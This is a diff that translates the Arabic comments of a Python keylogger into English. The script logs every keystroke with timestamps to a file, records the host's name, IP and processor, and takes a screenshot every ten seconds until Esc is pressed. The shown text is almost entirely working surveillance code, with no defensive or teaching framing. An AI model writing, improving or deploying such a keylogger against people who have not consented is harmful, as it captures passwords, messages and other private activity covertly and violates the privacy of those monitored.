@@ -6,13 +6,14 @@ from PIL import ImageGrab
 import time
 import os
 
-# إعدادات الملف
+# File settings
+# 
 LOG_FILE = "keylog.txt"
 SCREENSHOT_DIR = "screenshots"
 os.makedirs(SCREENSHOT_DIR, exist_ok=True)
 
 def get_system_info():
-    """جمع معلومات النظام"""
+    """Collect system information"""
     hostname = socket.gethostname()
     ip_address = socket.gethostbyname(hostname)
     processor = platform.processor()
@@ -30,7 +31,7 @@ def get_system_info():
     return info
 
 def on_press(key):
-    """تسجيل ضغطات المفاتيح"""
+    """Keystroke logging"""
     try:
         timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
         with open(LOG_FILE, "a") as f:
@@ -41,28 +42,28 @@ def on_press(key):
         with open(LOG_FILE, "a") as f:
             f.write(f"{timestamp}: '[{special_key}]'\n")
     
-    # إيقاف التسجيل عند الضغط على Esc
+    # Stop recording when pressing Esc
     if key == keyboard.Key.esc:
         return False
 
 def take_screenshot():
-    """أخذ لقطة شاشة"""
+    """Take a screenshot"""
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
     filename = f"{SCREENSHOT_DIR}/screenshot_{timestamp}.png"
     ImageGrab.grab().save(filename)
     return filename
 
 def main():
-    # تسجيل معلومات النظام
+    # Recording system information
     system_info = get_system_info()
     with open(LOG_FILE, "w") as f:
         f.write(system_info + "\nKey Log:\n")
     
-    # بدء تسجيل المفاتيح
+    # Start key recording
     listener = keyboard.Listener(on_press=on_press)
     listener.start()
     
-    # أخذ لقطات شاشة كل 10 ثوان
+    # Take screenshots every 10 seconds
     try:
         while listener.is_alive():
             take_screenshot()
@@ -74,3 +75,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
